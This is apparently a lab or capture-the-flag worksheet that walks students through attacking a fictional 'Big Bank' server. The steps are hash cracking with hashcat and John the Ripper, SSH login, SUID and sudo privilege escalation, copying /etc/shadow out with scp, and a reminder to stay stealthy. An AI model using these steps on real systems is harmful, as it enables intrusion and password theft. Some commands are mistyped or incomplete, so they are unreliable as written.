Phase 1: Reconnaissance (Web Scraping)
Goal: Find the leaked password hash hidden in the internal webpage.

Useful Tools:

curl [URL] - download and view the webpage
open the page in Firefox (easier to read but not necessary)

Phase 2: Hash Cracking
Goal: Crack the password hash using authorized tools.

Common Commands:
Using Hashcat (SHA-512 Linux password hash = mode 1800):
**hashcat - m 1800 -a 0 hash.txt /usr/share/wordlists/rockyou.txt**

Using John the Ripper:
**john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt**

Wordlist location in Kali Linux:
/usr/share/wordlist/rockyou.txt

(you may need to unzip it first using gunzip)


Phase 3: SSH Access
Goal: SSH into Big Bank's server using the cracked password.

Basic SSH Command:
ssh [username]@[server IP Address]


Phase 4: Privilege Escalation
Goal: Find a way to become root.

Things to check:
Check for SUID Binaries:
find / -perm -4000 -type f 2>/dev/null

Check user's Sudo rights:
sudo -l

Common Exploites:
Misconfigured SUID programs (rootbash, custom binaries)
Ability to run specific commands as root without password (NOPASSWD sudo)

Phase 5: Data Exfiltration
Goal: Steal the /etc/shadow file for cracking.

Copy the shadow file:
sudo cp

transfer file
scp student@ip:foler


Phase 6: Cracking More Passwords

Crack the stolen hashes with Hashcat:
hashcat -m 1800 -a 0 ~filelocation

Crack Stolen hashes with John:
john --wordlist=rockyou.txt ~filelocation


**IMPORTANT NOTES:**
Focus on staying stealthy -- don't run unnecessary noisy commands.
Work with your team
Take notes on cracked passwords and how to obtain them.


